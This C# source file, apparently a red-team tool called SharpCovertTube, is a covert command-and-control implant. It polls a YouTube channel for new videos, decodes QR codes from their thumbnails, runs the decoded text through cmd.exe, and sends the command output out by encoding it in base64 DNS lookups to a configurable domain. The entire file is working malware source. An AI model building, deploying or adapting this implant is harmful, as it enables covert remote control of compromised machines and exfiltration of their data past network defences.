using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using ZXing;

namespace SharpCovertTube
{
    internal class Program
    {
        // FILL VALUES
        public const string channel_id = "";
        public const string api_key = "";
        public const string dns_hostname = ".test.org";
        public const int seconds_delay = 60;


        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }


        // Source: https://blog.dotnetframework.org/2020/02/26/read-a-qr-code-in-c-using-the-zxing-net-library/
        static string ReadQR(string thumbnail_url)
        {
            var client = new WebClient();
            var stream = client.OpenRead(thumbnail_url);
            if (stream == null) return "";
            var bitmap = new Bitmap(stream);
            IBarcodeReader reader = new BarcodeReader();
            var result = reader.Decode(bitmap);
            string decoded_cmd = result.Text;
            return decoded_cmd;
        }

        // Source: MSDN
        static string ExecuteCommand(string command)
        {
            string output = "";
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                StreamReader reader2 = process.StandardOutput;
                output = reader2.ReadToEnd();
                process.WaitForExit();
            }
            return output;
        }


        static void DNSExfil(string response_cmd) {
            // Base64
            string base64_response_cmd = Base64Encode(response_cmd);
            Console.WriteLine("[+] Base64 response:\t{0}", base64_response_cmd);

            // DNS lookup
            try
            {
                string exfil_hostname = base64_response_cmd + dns_hostname;
                exfil_hostname.Trim();
                exfil_hostname = exfil_hostname.Replace("=", "");
                Console.WriteLine("[+] DNS lookup against:\t\t{0}", exfil_hostname);
                Dns.GetHostAddresses(exfil_hostname);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Exception: {0}", e.ToString());
            }
        }


        static void ReadVideo(string video_id, string channel_url)
        {
            Console.WriteLine("[+] Reading video with ID {0}", video_id);
            string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
            
            // Read QR
            string decoded_cmd = ReadQR(thumbnail_url);
            Console.WriteLine("[+] Value decoded from QR:\t{0}", decoded_cmd);
            
            // Execute command
            string response_cmd = ExecuteCommand(decoded_cmd);
            Console.WriteLine("[+] Response from command:\t{0}", response_cmd);

            // Exfiltrate
            DNSExfil(response_cmd);
        }


        static string getRequest(string url) {
            WebRequest wrGETURL = WebRequest.Create(url);
            Stream objStream = wrGETURL.GetResponse().GetResponseStream();
            StreamReader objReader = new StreamReader(objStream);
            string json_response_str = "";
            string sLine = "";

            while (sLine != null)
            {
                json_response_str += sLine;
                sLine = objReader.ReadLine();
            }

            return json_response_str;
        }


        static List<string> GetVideoIds(string channel_url)
        {
            List<string> VideoIds = new List<string>();
            string json_response_str = getRequest(channel_url);

            var deserialized = JSONSerializer<APIInfo>.DeSerialize(json_response_str);
            foreach (Item item in deserialized.items)
            {
                // Console.WriteLine("[+] VideoId: \t{0}", item.id.videoId);
                VideoIds.Add(item.id.videoId);
            }

            return VideoIds;
        }


        static void MonitorChannel(string channel_url, int seconds_delay) {
            // Initial videos
            List<string> Initial_VideoIds = GetVideoIds(channel_url);
            int number_of_videos = Initial_VideoIds.Count;
            foreach (string value in Initial_VideoIds)
            {
                Console.WriteLine("[+] ID: \t{0}", value);
            }

            while (true)
            {
                // Sleep
                Console.WriteLine("[+] Sleeping {0} seconds \n", seconds_delay);
                System.Threading.Thread.Sleep(1000 * seconds_delay);

                // Get list of videos
                List<string> VideoIds = GetVideoIds(channel_url);
                // If new videos -> Read
                if (VideoIds.Count > number_of_videos)
                {
                    Console.WriteLine("[+] New videos uploaded!");

                    var firstNotSecond = VideoIds.Except(Initial_VideoIds);
                    foreach (var video_id in firstNotSecond)
                    {
                        Console.WriteLine("[+] New ID: \t{0}", video_id);
                        ReadVideo(video_id, channel_url);
                    }

                    number_of_videos = VideoIds.Count;
                    Initial_VideoIds = VideoIds;
                }
                // No new videos
                else
                {
                    Console.WriteLine("[+] No new videos... Total: {0}", VideoIds.Count);
                }
            }
        }


        static void Main(string[] args)
        {
            string channel_url = "https://www.googleapis.com/youtube/v3/search?" + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
            Console.WriteLine("[+] URL to test for file upload: {0}", channel_url);
            MonitorChannel(channel_url, seconds_delay);
        }
    }
}